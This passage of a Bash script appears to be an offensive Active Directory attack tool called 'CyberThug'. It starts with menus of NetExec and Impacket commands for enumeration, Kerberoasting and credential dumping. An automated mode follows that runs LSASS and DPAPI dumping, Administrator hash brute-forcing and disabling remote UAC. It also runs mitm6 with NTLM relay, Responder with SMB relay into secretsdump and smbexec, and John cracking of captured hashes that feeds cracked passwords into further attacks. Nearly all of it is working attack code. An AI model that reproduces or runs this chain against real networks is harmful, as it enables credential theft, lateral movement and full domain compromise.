 \__,_|___/\___|_|  |_| |_|\__,_|_| |_| |_|\___|          \__,_|_| |_|\__,_|_|  \___|_| |_|\__' |
                                                                                           |___/
         1) username-anarchy -i users.txt > output_users.txt
       \e[0m"
     ;;
  esac 
  case "${1,,}" in
     n | nx | nxc)
     tool_found=true
       echo -e "\e[1;35m 
 _    __  ______  
| \ | \ \/ / ___| 
|  \| |\  / |     
| |\  |/  \ |___  
|_| \_/_/\_\____|

          1) nxc smb domain -u 'user' -p 'password' --continue-on-success
          2) nxc smb domain -u 'user' -p 'password' --users
          3) nxc smb domain -u 'user' -p 'password' --rid-brute
          4) nxc smb domain -u 'user' -p 'password' --shares
          5) nxc smb domain -u 'user' -p 'password' -M spider_plus 
          6) nxc smb domain -u 'user' -p 'password' --loggedon-users
          7) nxc smb domain -u 'user' -p 'password' -M enum_av
          8) nxc winrm domain -u 'user' -p 'password'
          9) nxc ldap domain -u 'user' -p 'password' --bloodhound --collection all --dns-server ip
          10) nxc smb domain --generate-krb5-file domain-krb5.conf
          11) nxc smb domain -u 'user' -p 'password' -M timeroast 
          12) nxc smb domain -u "user" -p 'password' --pass-pol
          13) nxc ldap domain -u 'user' -p 'password' --groups
          14) nxc ldap domain -u 'user' -p 'password' --computers
          15) nxc ldap domain -u 'user' -p 'password' --get-sid
          16) nxc ldap domain -u 'user' -p 'password' -M enum_trusts
          17) nxc ldap domain -u 'user' -p 'password' -M maq
          18) nxc smb domain -u 'user' -p 'password' -M zerologon
          19) nxc smb domain -u 'user' -p 'password' -M coerce_plus
          20) nxc smb domain -u 'user' -p 'password' -M nopac
          21) nxc smb domain -u 'user' -p 'password' -M gpp_password 
          22) nxc smb domain -u 'user' -p 'password' -M lsassy
          23) nxc ldap domain -u 'user' -p 'password' -M subnets
          24) nxc ldap domain -u 'user' -p 'password' -M pre2k
          25) nxc ldap domain -u 'user' -p 'password' -M laps
          26) nxc ldap domain -u 'user' -p 'password' -M pso
          27) nxc ldap domain -u 'user' -p 'password' -M adcs
          28) nxc smb domain -u 'user' -p 'password' -M enum_ca
          29) nxc smb domain -u 'user' -p 'password' -M bitlocker
          30) nxc smb domain -u 'user' -p 'password' -M dpapi_hash
          31) nxc smb domain -u 'user' -p 'password' -M nanodump
          32) nxc smb domain -u 'user' -p 'password' -M remote-uac -o ACTION=disable
          33) nxc smb domain -u 'user' -p 'password' -M ioxidresolver
          34) nxc smb domain -u 'user' -p 'password' -M backup_operator
          35) nxc smb domain -u 'user' -p 'password' -M keepass_discover
          36) nxc smb domain -u 'user' -p 'password' -M powershell_history
          37) nxc smb domain -u 'user' -p 'password' -M recent_files
          38) nxc smb domain -u 'user' -p 'password' -M winscp
          39) nxc smb domain -u 'user' -p 'password' -M teams_localdb
          40) nxc smb domain -u 'user' -p 'password' -M mremoteng
          41) nxc smb domain -u 'user' -p 'password' -M mobaxterm
          42) nxc smb domain -u 'user' -p 'password' -M putty
          43) nxc smb domain -u 'user' -p 'password' -M rdcman
          44) nxc smb domain -u 'user' -p 'password' -M wifi
          45) nxc smb domain -u 'user' -p 'password' --dpapi 
          46) nxc ldap domain -u 'user' -p 'password' --gmsa
	  47) nxc ldap domain -u 'user' -p 'password' --trusted-for-delegation
	  48) nxc ldap domain -u 'user' -p 'password' -M ldap-checker
          49) nxc mssql domain --local-auth -u 'user' -p 'password' -x 'command' 
       \e[0m" 
     ;;
  esac 
  case "${1,,}" in
     g | get | getnp | getnpusers | getnpusers.py )
     tool_found=true
       echo -e "\e[1;35m
  ____      _   _   _ ____  _   _                                 
 / ___| ___| |_| \ | |  _ \| | | |___  ___ _ __ ___   _ __  _   _ 
| |  _ / _ \ __|  \| | |_) | | | / __|/ _ \ '__/ __| | '_ \| | | |
| |_| |  __/ |_| |\  |  __/| |_| \__ \  __/ |  \__ \_| |_) | |_| |
 \____|\___|\__|_| \_|_|    \___/|___/\___|_|  |___(_) .__/ \__, |
                                                     |_|    |___/ 

          1) GetNPUsers.py -no-pass -usersfile users.txt domain/
       \e[0m"
     ;;
  esac 
  case "${1,,}" in
     g | get | getus | getuserspns | getuserspns.py )
     tool_found=true
       echo -e "\e[1;35m
  ____      _   _   _               ____  ____  _   _                   
 / ___| ___| |_| | | |___  ___ _ __/ ___||  _ \| \ | |___   _ __  _   _ 
| |  _ / _ \ __| | | / __|/ _ \ '__\___ \| |_) |  \| / __| | '_ \| | | |
| |_| |  __/ |_| |_| \__ \  __/ |   ___) |  __/| |\  \__ \_| |_) | |_| |
 \____|\___|\__|\___/|___/\___|_|  |____/|_|   |_| \_|___(_) .__/ \__, |
                                                           |_|    |___/ 
 
          1) GetUserSPNs.py domain/user:password -request
          2) GetUserSPNs.py -no-preauth "user" -usersfile users.txt -dc-host "DC" domain/
       \e[0m"
     ;;
  esac 
  case "${1,,}" in
     g | get | gettgt | gettgt.py )
     tool_found=true
       echo -e "\e[1;35m
            _  _____ ____ _____
  __ _  ___| ||_   _/ ___|_   _|_ __  _   _
 / _  |/ _ \ __|| || |  _  | | | '_ \| | | |
| (_| |  __/ |_ | || |_| | | |_| |_) | |_| |
 \__, |\___|\__||_| \____| |_(_) .__/ \__' |
 |___/                         |_|    |___/

          1) getTGT.py domain/user:password -dc-ip DC -k
          2) getTGT.py domain/user -hashes :hash -dc-ip DC -k
       \e[0m"
     ;;
  esac 
  if [ "$tool_found" != true ]; then
    echo -e "\e[1;35m[!] Enter an Existing Tool\e[0m"
    echo -e "\e[1;35m
          - nxc
          - GetNPUsers.py
          - GetUserSPNs.py
          - username-anarchy
    \e[0m"
  fi
}
DATE=$(date +"%F_Hour_=>_%H")
touch /tmp/.cyberthug_history
HISTFILE="/tmp/.cyberthug_history"
HISTSIZE=1000
HISTFILESIZE=2000
if [ -f "$HISTFILE" ]; then
    history -r "$HISTFILE"
fi

trap 'next_step=true' SIGINT
if [ "$next_step" = true ]; then
  next_step=false
fi
set -o history
read_input() {
    local var_name="$1"
    local prompt="$2"
    local default="$3"
    read -e -i "$default" -p $'\033[35m'"$prompt"$'\033[0m' "$var_name"
    history -s "${!var_name}" 
    cat /tmp/.cyberthug_history \
    | grep -v -e 'read_input() {' -e 'cp /tmp/.cyberthug_history' \
    | grep -v -E 'if \[\[ "\$1" == "-s" \]\]; then\s+tools \$2;\s+exit 0;\s+fi' \
    | grep -v -e '\.\.' \
    >> "$HOME/CyberThug_output/.cyberthug_history_$DATE" 2>/dev/null
} 
if [[ "$1" == "-s" ]]; then
    tools $2
    exit 0
fi
if [[ "$1" == "-t" ]]; then
    banner(){
     echo -e "\e[1;36m
     ╔════════════════════════════════════════════════════╗
     ║                ⚡ CyberThug ⚡                     ║
     ╚════════════════════════════════════════════════════╝
     \e[0m"
       echo -e "\033[35m
           0) auto
           1) nc
           2) meterpreter
           3) python_server
           4) smbclient
           5) nxc
           6) GetNPUsers.py
           7) GetUserSPNs.py
	   8) getTGT.py
	   9) evil-winrm
           10) Powerview
           11) findDelegation.py
       \033[0m"
       echo ""
       read_input tool $'\033[35m# \033[0m'
    }
    banner
    if [[ "$tool" == "0" ]]; then
       DATE=$(date +%F_%H-%M-%S)
       while true; do
            history -a "$HISTFILE"
            read_input DOMAIN $'\033[35mEnter The Domain : \033[0m'
            mkdir -p $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN 
            read_input User $'\033[35mEnter The User : \033[0m' 
            read_input Password $'\033[35mEnter The Password : \033[0m'
            read_input Ip $'\033[35mEnter The Ip : \033[0m'
            read_input DC $'\033[35mEnter The Domain Controller : \033[0m'
   	    read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
            p=$(ping -c 1 $DOMAIN | awk -F'[()]' '/PING/{print $2}')
            if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                 flag="-k"
                 dc_host="-dc-host $DC"
                 dc_ip="--dc-ip $p"
                 shopt -s extglob nocasematch
                 if [[ $DOMAIN =~ ^(dc[0-9]*\.) ]]; then
                      CLEAN_DOMAIN="${DOMAIN#${BASH_REMATCH[1]}}"
                 else
                      CLEAN_DOMAIN="$DOMAIN"
                 fi
            elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                flag=""
                dc_host="" 
                dc_ip=""        
                if [[ $DOMAIN =~ ^(dc[0-9]*\.) ]]; then
                     CLEAN_DOMAIN="${DOMAIN#${BASH_REMATCH[1]}}"
                else
                     CLEAN_DOMAIN="$DOMAIN"
                fi
            else 
                flag=""
                dc_host="" 
                dc_ip=""        
                if [[ $DOMAIN =~ ^(dc[0-9]*\.) ]]; then
                     CLEAN_DOMAIN="${DOMAIN#${BASH_REMATCH[1]}}"
                else
                     CLEAN_DOMAIN="$DOMAIN"
                fi
            fi            
            sudo ntpdate -s $DC 
	    echo ""
            echo -e "\033[36m[+]-- Running nxc smb $DC --generate-krb5-file /tmp/domain-krb5.conf $flag --[+]\033[0m"
            echo ""
            nxc smb $DC --generate-krb5-file /tmp/domain-krb5.conf $flag
            echo ""
            sudo cp /tmp/domain-krb5.conf /etc/krb5.conf 
            echo -e "\033[36m[+] Configuring /etc/krb5.conf ... \033[0m" 
            gnome-terminal -- bash -c "
next_step=false
trap '' SIGINT
trap 'next_step=true' SIGINT

if [ \"\$next_step\" = true ]; then
    next_step=false
fi
echo -e '
\e[1;35m
 _    __  ______  
| \ | \ \/ / ___| 
|  \| |\  / |     
| |\  |/  \ |___  
|_| \_/_/\_\____|

\e[0m'
gnome-terminal -- bash -c '
echo ''
read -p \"Press Enter to run Evil-Winrm for User => $User\"
echo '' 
evil-winrm -i $DOMAIN -u $User -p $Password
echo ''
getTGT.py $CLEAN_DOMAIN/$User:$Password -dc-ip $Ip -k
echo ''
export KRB5CCNAME=$User.ccache
echo ''
evil-winrm -i $DC -u $User -r $CLEAN_DOMAIN
exec bash '

gnome-terminal -- bash -c '
echo '' 
read -p \"Press Enter to run Powerview for User => $User\"
echo ''   
expect -c \"
set timeout -1
set send_slow {1 .001}
spawn powerview $CLEAN_DOMAIN/$User:$Password@$DC 
expect -re {PV.*❯};
send -s \\\"Get-Domain\\r\\\";
expect -re {PV.*❯};
send -s \\\"Get-DomainUser\\r\\\";
expect -re {PV.*❯};
send -s \\\"Get-DomainUser -Properties Samaccountname,memberof,description\\r\\\";
expect -re {PV.*❯};
send -s \\\"Get-DomainUser -spn\\r\\\";
expect -re {PV.*❯};
send -s \\\"Get-DomainUser -spn -Properties servicePrincipalName\\r\\\";
expect -re {PV.*❯};
send -s \\\"Get-DomainUser -PreAuthNotRequired\\r\\\";
expect -re {PV.*❯};
send -s \\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\r\\\";
expect -re {PV.*❯};
send -s \\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\r\\\";
expect -re {PV.*❯};
send -s \\\"Get-DomainGroup\\r\\\";
expect -re {PV.*❯};
send -s \\\"Get-DomainGroup -Properties name,member\\r\\\";
expect -re {PV.*❯};
send -s \\\"Get-DomainGroup -Identity \\\\\\\"Domain Admins\\\\\\\"\\r\\\";
expect -re {PV.*❯};
send -s \\\"Get-DomainGroupMember -Identity \\\\\\\"Domain Admins\\\\\\\"\\r\\\";
expect -re {PV.*❯};
send -s \\\"Get-DomainGroup -AdminCount\\r\\\";
expect -re {PV.*❯};
send -s \\\"Get-DomainTrust\\r\\\";
interact\"
echo ''
getTGT.py $CLEAN_DOMAIN/$User:$Password -dc-ip $Ip -k
echo ''
export KRB5CCNAME=$User.ccache
echo ''
expect -c \"
set timeout -1
set send_slow {1 .001}
spawn powerview $CLEAN_DOMAIN/$User:$Password@$DC -k
expect -re {PV.*❯};
send -s \\\"Get-Domain\\r\\\";
expect -re {PV.*❯};
send -s \\\"Get-DomainUser\\r\\\";
expect -re {PV.*❯};
send -s \\\"Get-DomainUser -Properties Samaccountname,memberof,description\\r\\\";
expect -re {PV.*❯};
send -s \\\"Get-DomainUser -spn\\r\\\";
expect -re {PV.*❯};
send -s \\\"Get-DomainUser -spn -Properties servicePrincipalName\\r\\\";
expect -re {PV.*❯};
send -s \\\"Get-DomainUser -PreAuthNotRequired\\r\\\";
expect -re {PV.*❯};
send -s \\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\r\\\";
expect -re {PV.*❯};
send -s \\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\r\\\";
expect -re {PV.*❯};
send -s \\\"Get-DomainGroup\\r\\\";
expect -re {PV.*❯};
send -s \\\"Get-DomainGroup -Properties name,member\\r\\\";
expect -re {PV.*❯};
send -s \\\"Get-DomainGroup -Identity \\\\\\\"Domain Admins\\\\\\\"\\r\\\";
expect -re {PV.*❯};
send -s \\\"Get-DomainGroupMember -Identity \\\\\\\"Domain Admins\\\\\\\"\\r\\\";
expect -re {PV.*❯};
send -s \\\"Get-DomainGroup -AdminCount\\r\\\";
expect -re {PV.*❯};
send -s \\\"Get-DomainTrust\\r\\\";
interact\"
exec bash'
echo ""
echo -e '\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M lsassy $flag --[+]\033[0m'
nxc smb $DOMAIN -u $User -p $Password -M lsassy $flag 
echo ''
echo -e '\033[36m[+]-- Running nxc ldap $DOMAIN -u $User -p $Password -M subnets $flag --[+]\033[0m'
nxc ldap $DOMAIN -u $User -p $Password -M subnets $flag 
echo ''
echo -e '\033[36m[+]-- Running nxc ldap $DOMAIN -u $User -p $Password -M pre2k $flag --[+]\033[0m'
nxc ldap $DOMAIN -u $User -p $Password -M pre2k $flag 
echo ''
echo -e '\033[36m[+]-- Running nxc ldap $DOMAIN -u $User -p $Password -M laps $flag --[+]\033[0m'
nxc ldap $DOMAIN -u $User -p $Password -M laps $flag 
echo ''
echo -e '\033[36m[+]-- Running nxc ldap $DOMAIN -u $User -p $Password -M pso $flag --[+]\033[0m'
nxc ldap $DOMAIN -u $User -p $Password -M pso $flag 
echo ''
echo -e '\033[36m[+]-- Running nxc ldap $DOMAIN -u $User -p $Password -M adcs $flag --[+]\033[0m'
nxc ldap $DOMAIN -u $User -p $Password -M adcs $flag 
echo ''
echo -e '\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M enum_ca $flag --[+]\033[0m'
nxc smb $DOMAIN -u $User -p $Password -M enum_ca $flag 
echo ''
echo -e '\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M bitlocker $flag --[+]\033[0m'
nxc smb $DOMAIN -u $User -p $Password -M bitlocker $flag 
echo ''
echo -e '\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M dpapi_hash $flag --[+]\033[0m'
nxc smb $DOMAIN -u $User -p $Password -M dpapi_hash $flag 
echo ''
echo -e '\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M nanodump $flag --[+]\033[0m'
nxc smb $DOMAIN -u $User -p $Password -M nanodump $flag 
echo ''
echo -e '\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M remote-uac -o ACTION=disable $flag --[+]\033[0m'
nxc smb $DOMAIN -u $User -p $Password -M remote-uac -o ACTION=disable $flag 
echo ''
echo -e '\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M ioxidresolver $flag --[+]\033[0m'
nxc smb $DOMAIN -u $User -p $Password -M ioxidresolver $flag 
echo ''
echo -e '\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M backup_operator $flag --[+]\033[0m'
nxc smb $DOMAIN -u $User -p $Password -M backup_operator $flag 
echo ''
echo -e '\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M keepass_discover $flag --[+]\033[0m'
nxc smb $DOMAIN -u $User -p $Password -M keepass_discover $flag 
echo ''
echo -e '\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M powershell_history $flag --[+]\033[0m'
nxc smb $DOMAIN -u $User -p $Password -M powershell_history $flag 
echo ''
echo -e '\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M recent_files $flag --[+]\033[0m'
nxc smb $DOMAIN -u $User -p $Password -M recent_files $flag 
echo ''
echo -e '\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M winscp $flag --[+]\033[0m'
nxc smb $DOMAIN -u $User -p $Password -M winscp $flag 
echo ''
echo -e '\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M teams_localdb $flag --[+]\033[0m'
nxc smb $DOMAIN -u $User -p $Password -M teams_localdb $flag 
echo ''
echo -e '\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M mremoteng $flag --[+]\033[0m'
nxc smb $DOMAIN -u $User -p $Password -M mremoteng $flag 
echo ''
echo -e '\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M mobaxterm $flag --[+]\033[0m'
nxc smb $DOMAIN -u $User -p $Password -M mobaxterm $flag 
echo ''
echo -e '\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M putty $flag --[+]\033[0m'
nxc smb $DOMAIN -u $User -p $Password -M putty $flag 
echo ''
echo -e '\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M rdcman $flag --[+]\033[0m'
nxc smb $DOMAIN -u $User -p $Password -M rdcman $flag 
echo ''
echo -e '\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M wifi $flag --[+]\033[0m'
nxc smb $DOMAIN -u $User -p $Password -M wifi $flag 
echo ''
echo -e '\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password --dpapi $flag --[+]\033[0m'
nxc smb $DOMAIN -u $User -p $Password --dpapi $flag 
echo ''
echo -e '\033[36m[+]-- Running nxc ldap $DOMAIN -u $User -p $Password --gmsa $flag --[+]\033[0m'
nxc ldap $DOMAIN -u $User -p $Password --gmsa $flag
echo ''
echo -e '\033[36m[+]-- Running nxc ldap $DOMAIN -u $User -p $Password --trusted-for-delegation $flag --[+]\033[0m'
nxc ldap $DOMAIN -u $User -p $Password --trusted-for-delegation $flag
echo '' 
echo -e '\033[36m[+]-- Running nxc ldap $DOMAIN -u $User -p $Password -M ldap-checker $flag --[+]\033[0m'
nxc ldap $DOMAIN -u $User -p $Password -M ldap-checker $flag 
echo ''
echo -e '\033[36m[+]-- Running nxc mssql $DOMAIN --local-auth -u $User -p $Password -x \"net user\" $flag --[+]\033[0m'
nxc mssql $DOMAIN --local-auth -u $User -p $Password -x \"net user\" $flag
echo '' 
exec bash
"
gnome-terminal -- bash -c "
echo -e '\033[36m[+]-- BruteForcing Administrator Hash --[+]\033[0m' 
echo ''
nxc smb $DOMAIN -u Administrator -H /usr/share/wordlists/hashes
exec bash  
"
echo ""
ntlmrelay_mitm6(){
gnome-terminal -- bash -c "
echo -e '\033[36m[+]-- Running Mitm6 Attack --[+]\033[0m'
echo ''

DOMAIN=\"'$DOMAIN'\"
DATE=\"'$DATE'\"
Ip=\"'$p'\"
CLEAN_DOMAIN=\"'$CLEAN_DOMAIN'\"
Kerberos=\"'$Kerberos'\"
DC=\"'$DC'\"

interfaces=()
while IFS= read -r line; do
    interfaces+=(\"\$line\")
done < <(ip -4 -o addr show up | awk '{print \$2\":\"\$4}' | sed 's#/.*##')

echo -e '\n[*] Available interfaces:'
echo ''
for i in \"\${!interfaces[@]}\"; do
    echo \"  [\$i] \${interfaces[\$i]}\"
done
echo ''
read -p 'Enter the number of the interface to use for Responder: ' index
interface=\$(echo \"\${interfaces[\$index]}\" | cut -d':' -f1 | xargs)
echo ''
echo -e \"[*] You selected interface: \$interface\"

gnome-terminal -- bash -c '
echo \"\"
read -p \"Do you need to escalate a user? (y/n): \" ans
echo \"\"
if [[ \$ans == \"Y\" || \$ans == \"y\" ]]; then
    read -p \"Enter the User to escalate: \" U
    read -p \"Enter the user'\''s password: \" P
fi

if [[ -z \"\$U\" ]]; then
    esc_user=\"\"
else
    esc_user=\"--escalate-user \$U --delegate-access\"
fi

echo \"\"
echo -e \"\n1) ldap\n2) ldaps\n\"
echo \"\"
read -p \"Choose (1 or 2): \" ch
echo \"\"
if [[ \$ch == \"1\" ]]; then
    ch1=\"ldap\"
else
    ch1=\"ldaps\"
fi

rand=\$((RANDOM))

ntlmrelayx.py -6 -wh internal-\$rand.'"$DOMAIN"' -t \$ch1://$DC -l mitm6_loot_'"$DOMAIN"'_'"$DATE"' --no-smb-server --add-computer --dump-hashes \$esc_user 2>&1 | \\
while IFS= read -r line; do
    echo \"\$line\"

    if [[ \"\$line\" =~ ([a-zA-Z0-9._-]+)\ can\ now\ impersonate\ users\ on\ ([A-Z0-9\\\\._\\\$-]+) ]]; then
        esc_user_name=\"\${BASH_REMATCH[1]}\"
        esc_computer_raw=\"\${BASH_REMATCH[2]}\"
        esc_computer=\$(echo \"\$esc_computer_raw\" | sed \"s/.*\\\\\\\\//\" | sed \"s/\\\$//\")
	c_computer=\${esc_computer%\$}        
	ip_c=\$(ping -c 1 \"\$c_computer\" 2>/dev/null | sed -n \"s/^PING[^(]*(\\([0-9.]*\\)).*/\\1/p\")
        if [ -z \"\$ip_c\" ]; then
	   echo \" ** Add \$c_computer to /etc/hosts \"	
	else        
           gnome-terminal -- bash -c \"secretsdump.py \$esc_computer/\$esc_user_name:\$P@\$ip_c ; secretsdump.py \$esc_computer/\$esc_user_name:\$P@\$ip_c > /tmp/secretsdump_-t_'\"$DATE\"'_\$esc_computer ; cp /tmp/secretsdump_-t_'\"$DATE\"'_\$esc_computer $HOME/CyberThug_output/cyberthug_-t_output/'\"$DOMAIN\"' ; exec bash\"
        fi
    fi
done
cp -r mitm6_loot_'"$DOMAIN"'* $HOME/CyberThug_output/cyberthug_-t_output/'"$DOMAIN"'
exec bash
'
gnome-terminal -- bash -c \"sudo mitm6 -i \$interface -d $DOMAIN; exec bash\"

exec bash
"
sleep 5
gnome-terminal -- bash -c '
echo -e "\033[36m[+]-- Running SMBRelayAttack --[+]\033[0m"
echo ""
DOMAIN="'"$DOMAIN"'"
DATE="'"$DATE"'"
Ip="'"$p"'"
CLEAN_DOMAIN="'"$CLEAN_DOMAIN"'"
Kerberos="'"$Kerberos"'"
DC="'"$DC"'"

nxc smb $DOMAIN | grep "signing:" | awk "{print \$16}" | tr -d ")" | sed "s/(signing://" > /tmp/smb_signing
signing_status=$(cat /tmp/smb_signing) 

if [[ "$signing_status" == "False" || "$signing_status" == "false" ]]; then
    nxc smb $DOMAIN | grep "(signing:False)" | awk "{print \$2}" > /tmp/targets.txt
    interfaces=()
    while IFS= read -r line; do
        interfaces+=("$line")
    done < <(ip -4 -o addr show up | awk "{print \$2 \":\" \$4}" | sed "s#/.*##")
    echo -e "\n[*] Available interfaces:"
    echo ""
    for i in "${!interfaces[@]}"; do
        echo "  [$i] ${interfaces[$i]}"
    done
    echo ""
    read -p "Enter the number of the interface to use for Responder: " index
    interface=$(echo "${interfaces[$index]}" | cut -d":" -f1 | xargs)
    echo "[*] You selected interface: $interface"
    echo ""
    echo -e "\033[36m[*] Disabling SMB and HTTP servers in Responder config \033[0m"
    sudo sed -i "/^SMB *=/ c\\SMB     = off" /etc/responder/Responder.conf
    sudo sed -i "/^HTTP *=/ c\\HTTP    = off" /etc/responder/Responder.conf
    echo -e "\033[36m[*] Current Responder config (SMB/HTTP): \033[0m"
    echo ""
    grep -E --color=always "^(SMB|HTTP) *=.*" /etc/responder/Responder.conf
    echo
    echo -e "\033[36m[*] Starting Responder in background \033[0m"
    echo "" 
    gnome-terminal -- bash -c "sudo responder -I $interface ; exec bash"
    echo ""
    echo -e "\033[36m[*] Starting ntlmrelayx with expect script \033[0m"
    echo ""
    target=$(cat /tmp/targets.txt)
    expect << EOD
      log_user 1
      sleep 8
      spawn ntlmrelayx.py -tf /tmp/targets.txt -of SAMhashes -smb2support -socks --keep-relaying --no-http-server  --no-wcf-server --no-raw-server
      set targets {}
      expect {
         eof { exit }

         -re "ntlmrelayx>" {
            sleep 10
            send "socks\r"
            exp_continue
         }

         -re {\s*SMB\s+(\S+)\s+(\S+)\s+(TRUE|FALSE)\s+445} {
            set Username \$expect_out(2,string)
            if {[lsearch \$targets \$Username] == -1} {
                lappend targets \$Username 
                exec gnome-terminal -- bash -c "sleep 2 ; echo '====================' ; echo \$Username ; echo '====================' ; echo '' ; cp SAMhashes_ntlmv2 $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/SAMhashes_smbrelay_ntlmv2_$DATE 2>/dev/null ; cp SAMhashes_ntlm $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/SAMhashes_smbrelay_ntlm_$DATE 2>/dev/null ; sleep 2 ; proxychains -q smbexec.py -no-pass \$Username@$target -debug ; exec bash"
                exec gnome-terminal -- bash -c "sleep 5 ; echo '====================' ; echo \$Username ; echo '====================' ; echo '' ; proxychains -q secretsdump.py -no-pass \$Username@$target -debug ; proxychains -q secretsdump.py -no-pass \$Username@$target > /tmp/secretsdump_-t_$DOMAIN ; cp /tmp/secretsdump_-t_$DOMAIN $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/secretsdump_-t_$DATE ; exec bash" 
		exec gnome-terminal -- bash -c "sleep 2 ; echo '====================' ; echo \$Username ; echo '====================' ; echo '' ; proxychains -q smbclient.py -no-pass \$Username@$target ; exec bash"
            }    
            exp_continue
           }
         }
EOD
else
    echo -e "\033[36m[!] SMB signing is enabled. No action taken \033[0m"
    echo ""
    echo -e "\033[36m===================================================\033[0m"
    echo ""
    interfaces=()
    while IFS= read -r line; do
        interfaces+=("$line")
    done < <(ip -4 -o addr show up | awk "{print \$2 \":\" \$4}" | sed "s#/.*##")
    echo -e "\n[*] Available interfaces:"
    echo ""
    for i in "${!interfaces[@]}"; do
        echo "  [$i] ${interfaces[$i]}"
    done
    echo ""
    read -p "Enter the number of the interface to use for Responder: " index
    interface=$(echo "${interfaces[$index]}" | cut -d":" -f1 | xargs)
    echo "[*] You selected interface: $interface"
    echo ""
    echo -e "\033[36m[*] Disabling SMB and HTTP servers in Responder config \033[0m"
    sudo sed -i "/^SMB *=/ c\\SMB     = On" /etc/responder/Responder.conf
    sudo sed -i "/^HTTP *=/ c\\HTTP    = On" /etc/responder/Responder.conf
    echo -e "\033[36m[*] Current Responder config (SMB/HTTP): \033[0m"
    echo ""
    grep -E --color=always "^(SMB|HTTP) *=.*" /etc/responder/Responder.conf
    echo ""
    gnome-terminal -- bash -c "echo '====================' ; echo Running Responder ; echo '====================' ; echo '' ; sudo responder -I $interface ; exec bash"
LOG_DIR="/usr/share/responder/logs"
JOHN_INPUT="/tmp/responder_john_input.txt"
WORDLIST="/usr/share/wordlists/rockyou.txt"
CRACKED_TRACKER="$HOME/.cracked_hashes.txt"
JOHN_OUTPUT="/tmp/john_cracked.txt"

echo "[*] Monitoring Responder logs and cracking NEW hashes with John ..."
touch "$CRACKED_TRACKER"
echo ""

while true; do
    > "$JOHN_INPUT"
    grep -h "NTLMv2-SSP Hash" "$LOG_DIR"/* 2>/dev/null | \
    awk -F "Hash     : " '"'"'{print $2}'"'"' | sort -u | while read -r hash; do
        if ! grep -qF "$hash" "$CRACKED_TRACKER"; then
            echo "$hash" >> "$JOHN_INPUT"
            echo "" 
            echo "$hash" >> "$CRACKED_TRACKER"
        fi
    done

    if [[ -s "$JOHN_INPUT" ]]; then
        echo "[+] New hashes found! Running John..."
        john --format=netntlmv2 "$JOHN_INPUT" --wordlist="$WORDLIST" > /dev/null
        john --show --format=netntlmv2 "$JOHN_INPUT" > "$JOHN_OUTPUT"
        echo "[*] Cracked credentials:"
        echo "" 
        cat "$JOHN_OUTPUT"
        echo ""

        awk -F: '"'"'$2 && $2 !~ /^[A-F0-9]{32,}$/ {user=$1; pass=$2; print user, pass}'"'"' "$JOHN_OUTPUT" | while read -r user p; do
            echo ""
            gnome-terminal -- bash -c "
echo '=========================================' 
echo  Launching Gnomes For $user with $p
echo '=========================================' 
echo '' 
for i in {1..15}; do
    dots=\$(( (i - 1) % 3 + 1 ))
    echo -ne \"\r\033[36mLoading\$(printf \"%-\${dots}s\" | tr \" \" \".\")\033[0m\"
    sleep 0.3
done
echo ''
gnome-terminal -- expect -c \"
spawn s -t
send \\\"0\\r$CLEAN_DOMAIN\\r$user\\r$p\\r$Ip\\r$DC\\r$Kerberos\\r\\\"
interact
\"
gnome-terminal -- bash -c \"
echo -e \\\"\\\e[1;32m[+] User: $user \e[0m\\\"
echo -e \\\"\\\e[1;32m[+] Password: $p \e[0m\\\"
echo -e \\\"\\\e[1;32m[+] DC: $DC \e[0m\\\"
echo -e \\\"\\\e[1;32m[+] Domain: $DOMAIN  \e[0m\\\"
echo -e \\\"\\\e[1;32m[+] Trying powerview direct auth for $user  ...\e[0m\\\"
echo ''
echo -e \\\"\\\e[1;32m[+]-- Running powerview $CLEAN_DOMAIN/$user:$p@$DC --[+]\e[0m\\\"
echo ''
expect -c \\\"set timeout -1
set send_slow {1 .001}
spawn powerview $CLEAN_DOMAIN/$user:$p@$DC
expect -re {PV.*❯};
send -s \\\\\\\"Get-Domain\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn -Properties servicePrincipalName\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -PreAuthNotRequired\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
